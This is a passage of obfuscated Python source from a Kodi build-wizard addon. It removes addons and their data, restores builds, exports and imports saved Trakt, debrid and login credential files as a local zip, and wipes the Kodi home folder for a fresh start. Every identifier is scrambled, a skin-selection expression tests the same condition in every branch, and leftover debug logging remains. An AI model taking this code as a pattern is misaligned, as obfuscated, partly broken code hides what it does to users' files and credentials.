		O0OOO0O0OO00O0O00 =os .path .join (ADDONS ,O0OOO0OO0O0O0O0OO )#line:4598
		wiz .log ("Removing Addon %s"%O0OOO0OO0O0O0O0OO )#line:4599
		wiz .cleanHouse (O0OOO0O0OO00O0O00 )#line:4600
		xbmc .sleep (1000 )#line:4601
		try :shutil .rmtree (O0OOO0O0OO00O0O00 )#line:4602
		except Exception as O000O000OO0O0O000 :wiz .log ("Error removing %s"%O0OOO0OO0O0O0O0OO ,xbmc .LOGNOTICE )#line:4603
		removeAddonData (O0OOO0OO0O0O0O0OO ,OOOOO0O0000OO0O0O ,over )#line:4604
	if over ==False :#line:4605
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OOOOO0O0000OO0O0O ))#line:4606
def removeAddonData (O0O0O0O0OO0OO0O00 ,name =None ,over =False ):#line:4608
	if O0O0O0O0OO0OO0O00 =='all':#line:4609
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4610
			wiz .cleanHouse (ADDOND )#line:4611
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4612
	elif O0O0O0O0OO0OO0O00 =='uninstalled':#line:4613
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4614
			OO0OOOO0O00OOOOO0 =0 #line:4615
			for OOOOO0O00O0000OO0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4616
				O0OOO0OO000000O0O =OOOOO0O00O0000OO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4617
				if O0OOO0OO000000O0O in EXCLUDES :pass #line:4618
				elif os .path .exists (os .path .join (ADDONS ,O0OOO0OO000000O0O )):pass #line:4619
				else :wiz .cleanHouse (OOOOO0O00O0000OO0 );OO0OOOO0O00OOOOO0 +=1 ;wiz .log (OOOOO0O00O0000OO0 );shutil .rmtree (OOOOO0O00O0000OO0 )#line:4620
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OOOO0O00OOOOO0 ))#line:4621
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4622
	elif O0O0O0O0OO0OO0O00 =='empty':#line:4623
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4624
			OO0OOOO0O00OOOOO0 =wiz .emptyfolder (ADDOND )#line:4625
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OOOO0O00OOOOO0 ))#line:4626
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4627
	else :#line:4628
		O00OO0O0O00O0000O =os .path .join (USERDATA ,'addon_data',O0O0O0O0OO0OO0O00 )#line:4629
		if O0O0O0O0OO0OO0O00 in EXCLUDES :#line:4630
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4631
		elif os .path .exists (O00OO0O0O00O0000O ):#line:4632
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O0O0O0OO0OO0O00 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4633
				wiz .cleanHouse (O00OO0O0O00O0000O )#line:4634
				try :#line:4635
					shutil .rmtree (O00OO0O0O00O0000O )#line:4636
				except :#line:4637
					wiz .log ("Error deleting: %s"%O00OO0O0O00O0000O )#line:4638
			else :#line:4639
				wiz .log ('Addon data for %s was not removed'%O0O0O0O0OO0OO0O00 )#line:4640
	wiz .refresh ()#line:4641
def restoreit (OOOOO0OOOOOOOO000 ):#line:4643
	if OOOOO0OOOOOOOO000 =='build':#line:4644
		OO0O00000O0O0OOO0 =freshStart ('restore')#line:4645
		if OO0O00000O0O0OOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4646
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4647
		wiz .skinToDefault ()#line:4648
	wiz .restoreLocal (OOOOO0OOOOOOOO000 )#line:4649
def restoreextit (O00OOO000OO000000 ):#line:4651
	if O00OOO000OO000000 =='build':#line:4652
		O0O00O0000O000000 =freshStart ('restore')#line:4653
		if O0O00O0000O000000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4654
	wiz .restoreExternal (O00OOO000OO000000 )#line:4655
def buildInfo (O0OO0O00OO0O00O0O ):#line:4657
	if wiz .workingURL (SPEEDFILE )==True :#line:4658
		if wiz .checkBuild (O0OO0O00OO0O00O0O ,'url'):#line:4659
			O0OO0O00OO0O00O0O ,OO00OOO00OO0O00O0 ,O00OOO00OOOOOO000 ,O0OOOOOO0OO000000 ,O0O00OOO0O000OO00 ,OO00OO0OO0OO0O0OO ,OO0O0OOO0OOO00O00 ,OOOO000O0OOO0O0OO ,OO0OOO0OO0O00OOO0 ,O0000O0OO00OO0OO0 ,O0OOOO0OO0O00O00O =wiz .checkBuild (O0OO0O00OO0O00O0O ,'all')#line:4660
			O0000O0OO00OO0OO0 ='Yes'if O0000O0OO00OO0OO0 .lower ()=='yes'else 'No'#line:4661
			OOO0000O00OOOO0O0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO0O00OO0O00O0O )#line:4662
			OOO0000O00OOOO0O0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00OOO00OO0O00O0 )#line:4663
			if not OO00OO0OO0OO0O0OO =="http://":#line:4664
				O0OO00OO0OOO00OOO =wiz .themeCount (O0OO0O00OO0O00O0O ,False )#line:4665
				OOO0000O00OOOO0O0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0OO00OO0OOO00OOO ))#line:4666
			OOO0000O00OOOO0O0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00OOO0O000OO00 )#line:4667
			OOO0000O00OOOO0O0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000O0OO00OO0OO0 )#line:4668
			OOO0000O00OOOO0O0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOOO0OO0O00O00O )#line:4669
			wiz .TextBox (ADDONTITLE ,OOO0000O00OOOO0O0 )#line:4670
		else :wiz .log ("Invalid Build Name!")#line:4671
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4672
def buildVideo (O0O000000O0O00O00 ):#line:4674
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4675
	if wiz .workingURL (SPEEDFILE )==True :#line:4676
		O0O00OOO00O0O00OO =wiz .checkBuild (O0O000000O0O00O00 ,'preview')#line:4677
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0O000000O0O00O00 )#line:4678
		if O0O00OOO00O0O00OO and not O0O00OOO00O0O00OO =='http://':playVideo (O0O00OOO00O0O00OO )#line:4679
		else :wiz .log ("[%s]Unable to find url for video preview"%O0O000000O0O00O00 )#line:4680
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4681
def dependsList (OO0O0000000O00OO0 ):#line:4683
	OOO00OOOO0OOO000O =os .path .join (ADDONS ,OO0O0000000O00OO0 ,'addon.xml')#line:4684
	if os .path .exists (OOO00OOOO0OOO000O ):#line:4685
		OO0O0O00OO00OOOOO =open (OOO00OOOO0OOO000O ,mode ='r');O00OO0000OO0O0OO0 =OO0O0O00OO00OOOOO .read ();OO0O0O00OO00OOOOO .close ();#line:4686
		O000OOOO00OO0O000 =wiz .parseDOM (O00OO0000OO0O0OO0 ,'import',ret ='addon')#line:4687
		OOO000O0OO0OO0O0O =[]#line:4688
		for OOO000OO0O00OO000 in O000OOOO00OO0O000 :#line:4689
			if not 'xbmc.python'in OOO000OO0O00OO000 :#line:4690
				OOO000O0OO0OO0O0O .append (OOO000OO0O00OO000 )#line:4691
		return OOO000O0OO0OO0O0O #line:4692
	return []#line:4693
def manageSaveData (OO000OOO0000O0000 ):#line:4695
	if OO000OOO0000O0000 =='import':#line:4696
		O0OOO00OO0000O0OO =os .path .join (ADDONDATA ,'temp')#line:4697
		if not os .path .exists (O0OOO00OO0000O0OO ):os .makedirs (O0OOO00OO0000O0OO )#line:4698
		O00OOOO0000OO00O0 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4699
		if not O00OOOO0000OO00O0 .endswith ('.zip'):#line:4700
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4701
			return #line:4702
		OOO0O00OOO0000OO0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4703
		O00O00O000OO0OO0O =xbmcvfs .copy (O00OOOO0000OO00O0 ,OOO0O00OOO0000OO0 )#line:4704
		wiz .log ("%s"%str (O00O00O000OO0OO0O ))#line:4705
		extract .all (xbmc .translatePath (OOO0O00OOO0000OO0 ),O0OOO00OO0000O0OO )#line:4706
		OOO0OO0OO0OO0O0OO =os .path .join (O0OOO00OO0000O0OO ,'trakt')#line:4707
		OO0O0000O0O0O00OO =os .path .join (O0OOO00OO0000O0OO ,'login')#line:4708
		OOO000OOO000O00O0 =os .path .join (O0OOO00OO0000O0OO ,'debrid')#line:4709
		O0000000O0O00O00O =0 #line:4710
		if os .path .exists (OOO0OO0OO0OO0O0OO ):#line:4711
			O0000000O0O00O00O +=1 #line:4712
			OOO000OOO00OO0O0O =os .listdir (OOO0OO0OO0OO0O0OO )#line:4713
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4714
			for O00OO0O0O0O0000OO in OOO000OOO00OO0O0O :#line:4715
				O00000OO000O0OOO0 =os .path .join (traktit .TRAKTFOLD ,O00OO0O0O0O0000OO )#line:4716
				OO0O0OO0O0OO0000O =os .path .join (OOO0OO0OO0OO0O0OO ,O00OO0O0O0O0000OO )#line:4717
				if os .path .exists (O00000OO000O0OOO0 ):#line:4718
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00OO0O0O0O0000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4719
					else :os .remove (O00000OO000O0OOO0 )#line:4720
				shutil .copy (OO0O0OO0O0OO0000O ,O00000OO000O0OOO0 )#line:4721
			traktit .importlist ('all')#line:4722
			traktit .traktIt ('restore','all')#line:4723
		if os .path .exists (OO0O0000O0O0O00OO ):#line:4724
			O0000000O0O00O00O +=1 #line:4725
			OOO000OOO00OO0O0O =os .listdir (OO0O0000O0O0O00OO )#line:4726
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4727
			for O00OO0O0O0O0000OO in OOO000OOO00OO0O0O :#line:4728
				O00000OO000O0OOO0 =os .path .join (loginit .LOGINFOLD ,O00OO0O0O0O0000OO )#line:4729
				OO0O0OO0O0OO0000O =os .path .join (OO0O0000O0O0O00OO ,O00OO0O0O0O0000OO )#line:4730
				if os .path .exists (O00000OO000O0OOO0 ):#line:4731
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00OO0O0O0O0000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4732
					else :os .remove (O00000OO000O0OOO0 )#line:4733
				shutil .copy (OO0O0OO0O0OO0000O ,O00000OO000O0OOO0 )#line:4734
			loginit .importlist ('all')#line:4735
			loginit .loginIt ('restore','all')#line:4736
		if os .path .exists (OOO000OOO000O00O0 ):#line:4737
			O0000000O0O00O00O +=1 #line:4738
			OOO000OOO00OO0O0O =os .listdir (OOO000OOO000O00O0 )#line:4739
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4740
			for O00OO0O0O0O0000OO in OOO000OOO00OO0O0O :#line:4741
				O00000OO000O0OOO0 =os .path .join (debridit .REALFOLD ,O00OO0O0O0O0000OO )#line:4742
				OO0O0OO0O0OO0000O =os .path .join (OOO000OOO000O00O0 ,O00OO0O0O0O0000OO )#line:4743
				if os .path .exists (O00000OO000O0OOO0 ):#line:4744
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00OO0O0O0O0000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4745
					else :os .remove (O00000OO000O0OOO0 )#line:4746
				shutil .copy (OO0O0OO0O0OO0000O ,O00000OO000O0OOO0 )#line:4747
			debridit .importlist ('all')#line:4748
			debridit .debridIt ('restore','all')#line:4749
		wiz .cleanHouse (O0OOO00OO0000O0OO )#line:4750
		wiz .removeFolder (O0OOO00OO0000O0OO )#line:4751
		os .remove (OOO0O00OOO0000OO0 )#line:4752
		if O0000000O0O00O00O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4753
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4754
	elif OO000OOO0000O0000 =='export':#line:4755
		OOOOO0OOO0OO00OOO =xbmc .translatePath (MYBUILDS )#line:4756
		OO000O0OO000OOO0O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4757
		traktit .traktIt ('update','all')#line:4758
		loginit .loginIt ('update','all')#line:4759
		debridit .debridIt ('update','all')#line:4760
		O00OOOO0000OO00O0 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4761
		O00OOOO0000OO00O0 =xbmc .translatePath (O00OOOO0000OO00O0 )#line:4762
		O0OO000000OOOO000 =os .path .join (OOOOO0OOO0OO00OOO ,'SaveData.zip')#line:4763
		O0000O0OO0OOOOOOO =zipfile .ZipFile (O0OO000000OOOO000 ,mode ='w')#line:4764
		for O0O0O0OO00O000000 in OO000O0OO000OOO0O :#line:4765
			if os .path .exists (O0O0O0OO00O000000 ):#line:4766
				OOO000OOO00OO0O0O =os .listdir (O0O0O0OO00O000000 )#line:4767
				for OO00O00000OO0OOOO in OOO000OOO00OO0O0O :#line:4768
					O0000O0OO0OOOOOOO .write (os .path .join (O0O0O0OO00O000000 ,OO00O00000OO0OOOO ),os .path .join (O0O0O0OO00O000000 ,OO00O00000OO0OOOO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4769
		O0000O0OO0OOOOOOO .close ()#line:4770
		if O00OOOO0000OO00O0 ==OOOOO0OOO0OO00OOO :#line:4771
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO000000OOOO000 ))#line:4772
		else :#line:4773
			try :#line:4774
				xbmcvfs .copy (O0OO000000OOOO000 ,os .path .join (O00OOOO0000OO00O0 ,'SaveData.zip'))#line:4775
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O00OOOO0000OO00O0 ,'SaveData.zip')))#line:4776
			except :#line:4777
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO000000OOOO000 ))#line:4778
def freshStart (install =None ,over =False ):#line:4783
	if USERNAME =='':#line:4784
		ADDON .openSettings ()#line:4785
		sys .exit ()#line:4786
	OO000OO000O0OO000 =u_list (SPEEDFILE )#line:4787
	(OO000OO000O0OO000 )#line:4788
	O0O0O0OO0O00O0OO0 =(wiz .workingURL (OO000OO000O0OO000 ))#line:4789
	(O0O0O0OO0O00O0OO0 )#line:4790
	if KEEPTRAKT =='true':#line:4791
		traktit .autoUpdate ('all')#line:4792
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4793
	if KEEPREAL =='true':#line:4794
		debridit .autoUpdate ('all')#line:4795
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4796
	if KEEPLOGIN =='true':#line:4797
		loginit .autoUpdate ('all')#line:4798
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4799
	if over ==True :O00OO0OO00OOO00O0 =1 #line:4800
	elif install =='restore':O00OO0OO00OOO00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4801
	elif install :O00OO0OO00OOO00O0 =1 #line:4802
	else :O00OO0OO00OOO00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4803
	if O00OO0OO00OOO00O0 :#line:4804
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4805
			OOOOOOO0O0OO0O000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4806
			skinSwitch .swapSkins (OOOOOOO0O0OO0O000 )#line:4809
			O0OO0OO000OOO0O0O =0 #line:4810
			xbmc .sleep (1000 )#line:4811
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO0OO000OOO0O0O <150 :#line:4812
				O0OO0OO000OOO0O0O +=1 #line:4813
				xbmc .sleep (1000 )#line:4814
				wiz .ebi ('SendAction(Select)')#line:4815
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4816
				wiz .ebi ('SendClick(11)')#line:4817
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4818
			xbmc .sleep (1000 )#line:4819
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4820
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4821
			return #line:4822
		wiz .addonUpdates ('set')#line:4823
		O0O0O0OO0O0OOOO0O =os .path .abspath (HOME )#line:4824
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4825
		O00O0OO00OOO00OOO =sum ([len (O00O00OO0O0OO0OOO )for OOO0OOO0O0OOO0000 ,OO00O0000O0000OOO ,O00O00OO0O0OO0OOO in os .walk (O0O0O0OO0O0OOOO0O )]);O0O000O0O0000OO00 =0 #line:4826
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4827
		EXCLUDES .append ('My_Builds')#line:4828
		EXCLUDES .append ('archive_cache')#line:4829
		EXCLUDES .append ('script.module.requests')#line:4830
		EXCLUDES .append ('myfav.anon')#line:4831
		if KEEPREPOS =='true':#line:4832
			O0O0O00OOOO000OOO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4833
			for O000O0OOO00OOOO00 in O0O0O00OOOO000OOO :#line:4834
				O0OO0O000000OOOO0 =os .path .split (O000O0OOO00OOOO00 [:-1 ])[1 ]#line:4835
				if not O0OO0O000000OOOO0 ==EXCLUDES :#line:4836
					EXCLUDES .append (O0OO0O000000OOOO0 )#line:4837
		if KEEPSUPER =='true':#line:4838
			EXCLUDES .append ('plugin.program.super.favourites')#line:4839
		if KEEPMOVIELIST =='true':#line:4840
			EXCLUDES .append ('plugin.video.metalliq')#line:4841
		if KEEPMOVIELIST =='true':#line:4842
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4843
		if KEEPADDONS =='true':#line:4844
			EXCLUDES .append ('addons')#line:4845
		if KEEPADDONS =='true':#line:4846
			EXCLUDES .append ('addon_data')#line:4847
		EXCLUDES .append ('plugin.video.elementum')#line:4850
		EXCLUDES .append ('script.elementum.burst')#line:4851
		EXCLUDES .append ('script.elementum.burst-master')#line:4852
		EXCLUDES .append ('plugin.video.quasar')#line:4853
		EXCLUDES .append ('script.quasar.burst')#line:4854
		EXCLUDES .append ('skin.estuary')#line:4855
		if KEEPWHITELIST =='true':#line:4858
			OOOO0O00O00OOOO0O =''#line:4859
			OOOOO0O00O0O0O000 =wiz .whiteList ('read')#line:4860
			if len (OOOOO0O00O0O0O000 )>0 :#line:4861
				for O000O0OOO00OOOO00 in OOOOO0O00O0O0O000 :#line:4862
					try :O00OO0O0OO0O0O0OO ,OOOO00O0OO000O0O0 ,O0O0000O0O0O00000 =O000O0OOO00OOOO00 #line:4863
					except :pass #line:4864
					if O0O0000O0O0O00000 .startswith ('pvr'):OOOO0O00O00OOOO0O =OOOO00O0OO000O0O0 #line:4865
					OOO000OO0O00000O0 =dependsList (O0O0000O0O0O00000 )#line:4866
					for O000O0OO0O000OOO0 in OOO000OO0O00000O0 :#line:4867
						if not O000O0OO0O000OOO0 in EXCLUDES :#line:4868
							EXCLUDES .append (O000O0OO0O000OOO0 )#line:4869
						O000O000OOOO00OO0 =dependsList (O000O0OO0O000OOO0 )#line:4870
						for O000O0O000OO0OOO0 in O000O000OOOO00OO0 :#line:4871
							if not O000O0O000OO0OOO0 in EXCLUDES :#line:4872
								EXCLUDES .append (O000O0O000OO0OOO0 )#line:4873
					if not O0O0000O0O0O00000 in EXCLUDES :#line:4874
						EXCLUDES .append (O0O0000O0O0O00000 )#line:4875
				if not OOOO0O00O00OOOO0O =='':wiz .setS ('pvrclient',O0O0000O0O0O00000 )#line:4876
		if wiz .getS ('pvrclient')=='':#line:4877
			for O000O0OOO00OOOO00 in EXCLUDES :#line:4878
				if O000O0OOO00OOOO00 .startswith ('pvr'):#line:4879
					wiz .setS ('pvrclient',O000O0OOO00OOOO00 )#line:4880
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4881
		O0O00O0O0O000OOO0 =wiz .latestDB ('Addons')#line:4882
		for O0O0000OO00000OO0 ,O00O000000000OO0O ,OOO0O00000O00OO00 in os .walk (O0O0O0OO0O0OOOO0O ,topdown =True ):#line:4883
			O00O000000000OO0O [:]=[OOO0O0000O0OO00OO for OOO0O0000O0OO00OO in O00O000000000OO0O if OOO0O0000O0OO00OO not in EXCLUDES ]#line:4884
			for O00OO0O0OO0O0O0OO in OOO0O00000O00OO00 :#line:4885
				O0O000O0O0000OO00 +=1 #line:4886
				O0O0000O0O0O00000 =O0O0000OO00000OO0 .replace ('/','\\').split ('\\')#line:4887
				O0OO0OO000OOO0O0O =len (O0O0000O0O0O00000 )-1 #line:4889
				if O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4890
				elif O00OO0O0OO0O0O0OO =='MyVideos99.db'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4891
				elif O00OO0O0OO0O0O0OO =='MyVideos107.db'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4892
				elif O00OO0O0OO0O0O0OO =='MyVideos116.db'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4893
				elif O00OO0O0OO0O0O0OO =='MyVideos99.db'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4894
				elif O00OO0O0OO0O0O0OO =='MyVideos107.db'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4895
				elif O00OO0O0OO0O0O0OO =='MyVideos116.db'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4896
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4897
				elif O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -2 ]=='userdata'and O0O0000O0O0O00000 [O0OO0OO000OOO0O0O -1 ]=='addon_data'and 'skin.anonymous.mod'in O0O0000O0O0O00000 [O0OO0OO000OOO0O0O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0000OO00000OO0 ,O00OO0O0OO0O0O0OO ),xbmc .LOGNOTICE )#line:4898
